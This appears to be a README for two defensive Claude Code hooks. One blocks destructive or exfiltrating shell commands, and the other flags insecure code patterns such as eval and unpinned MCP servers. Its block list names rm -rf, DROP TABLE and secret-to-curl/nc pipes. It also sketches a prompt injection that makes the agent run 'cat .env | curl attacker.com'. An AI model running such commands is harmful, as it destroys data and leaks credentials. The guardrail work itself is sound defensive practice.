# Workspace Safety Hooks

Two PreToolUse hooks for Claude Code. They run before every tool call and stop
the agent from doing something you will regret.

---

## guardrail_check.py

**What it does**

Intercepts Bash commands before they run. Blocks four categories:

1. Destructive shell commands -- `rm -rf`, `git reset --hard`, `git push --force`,
   `DROP TABLE`, `DELETE FROM`. Any match exits 2 (blocked) with a plain-English
   reason shown to the user.

2. Protected path deletion -- any `rm` or `delete` that touches your `.env`,
   credentials files, `CLAUDE.md`, `.git/`, or whatever else you put in
   `PROTECTED_PATHS`. Edit that constant near the top of the file to match your
   project layout.

3. Exfiltration patterns -- catches the most common prompt-injection attack path:
   read a secret file, pipe it to `curl`. Specifically blocks:
   - `base64 ... | curl/wget/nc`
   - `cat .env | curl/wget/nc`
   - `curl --data @somefile <non-allowlisted-host>`
   Add your own trusted hosts to `EXFIL_ALLOWLIST_HOSTS` if you upload to your
   own API endpoint and the hook flags it.

4. Unvetted third-party installs -- if you use skill-vet (also in this kit),
   the hook stops the agent from copying code into `.claude/skills/`, `.mcp.json`,
   or similar install targets without a fresh vet-approval token. If you are not
   using skill-vet, leave `PROTECTED_INSTALL_TARGETS` as-is or empty it.

**Why it matters**

Without this hook, a malicious prompt injected through a scraped web page or a
tool response can issue `rm -rf .` or `cat .env | curl attacker.com` and Claude
Code will run it. One blocked command is cheaper than one incident.

**Install**

1. Copy `guardrail_check.py` to `.claude/hooks/guardrail_check.py`.
2. Merge the hook entry below into `.claude/settings.json` under `hooks`.
3. Edit `PROTECTED_PATHS` and `EXFIL_ALLOWLIST_HOSTS` at the top of the file.
4. Restart Claude Code.

---

## security_check.py

**What it does**

Intercepts Write, Edit, and MultiEdit calls and scans the content about to be
written for security anti-patterns. It is non-blocking for almost everything:
it prints a one-time warning per session per file and lets the edit proceed.
The one exception is blocking (exit 2):

- **Unpinned MCP servers in .mcp.json** -- if the edit adds an `npx` or `uvx`
  server without an exact version pin, the hook blocks it unless a fresh
  skill-vet approval token is present. Unpinned means the agent auto-installs
  whatever version is latest at run time, which is a supply-chain risk.

For everything else it warns once, then stays silent for the rest of the session
so it does not interrupt your flow. Patterns covered:

| Pattern | Languages |
|---|---|
| `eval()` | Python, JS/TS |
| `exec()` | Python |
| `os.system()` | Python |
| `subprocess(..., shell=True)` | Python |
| `pickle.load/loads()` | Python |
| `yaml.load()` without SafeLoader | Python |
| `requests/httpx(..., verify=False)` | Python |
| `new Function(...)` | JS/TS |
| `child_process.exec()` | JS/TS |
| `dangerouslySetInnerHTML` | JSX/TSX |
| `element.innerHTML =` | JS/TS/HTML |
| `document.write()` | JS/TS/HTML |
| Hardcoded credential shapes | Any file |

**Why it matters**

You can tell the agent "never use eval" and it will agree. But under load it
forgets. This hook fires during the actual edit, not in a planning step that
gets compressed away.

**Install**

1. Copy `security_check.py` to `.claude/hooks/security_check.py`.
2. Merge the hook entry below into `.claude/settings.json` under `hooks`.
3. Restart Claude Code.

No configuration needed. To disable the MCP blocking gate (if you are not using
skill-vet), set `PROTECTED_MCP_GATE = False` near the top of the file.

---

## settings.json snippet

Add both hooks to `.claude/settings.json`. If you already have a `hooks` key,
merge the `PreToolUse` array entries -- do not replace the whole `hooks` object.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 .claude/hooks/guardrail_check.py"
          }
        ]
      },
      {
        "matcher": "Write|Edit|MultiEdit",
        "hooks": [
          {
            "type": "command",
            "command": "python3 .claude/hooks/security_check.py"
          }
        ]
      }
    ]
  }
}
```

The `matcher` field is a regex matched against the tool name. Adjust if Claude
Code changes tool names in a future release.

---

## Dependencies

Both hooks are self-contained Python 3 standard-library scripts. No pip installs.

The quarantine install gate in `guardrail_check.py` and the MCP blocking gate in
`security_check.py` both reference `active/.vet-approval/` for skill-vet approval
tokens. If you are not using skill-vet, these gates degrade gracefully:

- `guardrail_check.py` will block installs from quarantine (because no token
  exists) but will still allow workspace-internal moves.
- `security_check.py` will block unpinned MCP server edits until you either pin
  the version or set `PROTECTED_MCP_GATE = False`.

`skill_vet.py` ships separately in this kit and writes the approval tokens these
hooks read. The hooks do not call `skill_vet.py` directly.

---

## Customization checklist

- [ ] `PROTECTED_PATHS` in `guardrail_check.py` -- add your sensitive folders.
- [ ] `EXFIL_ALLOWLIST_HOSTS` in `guardrail_check.py` -- add your own API hosts.
- [ ] `EMAIL_SEND_SCRIPTS` in `guardrail_check.py` -- add your send script names
      (leave empty if you do not have email send scripts).
- [ ] `OWNER_EMAIL` in `guardrail_check.py` -- replace `you@example.com` with
      your address so `--to <you>` is always allowed through.
- [ ] `PROTECTED_MCP_GATE` in `security_check.py` -- set to `False` if you do
      not use skill-vet and do not want MCP edits blocked.
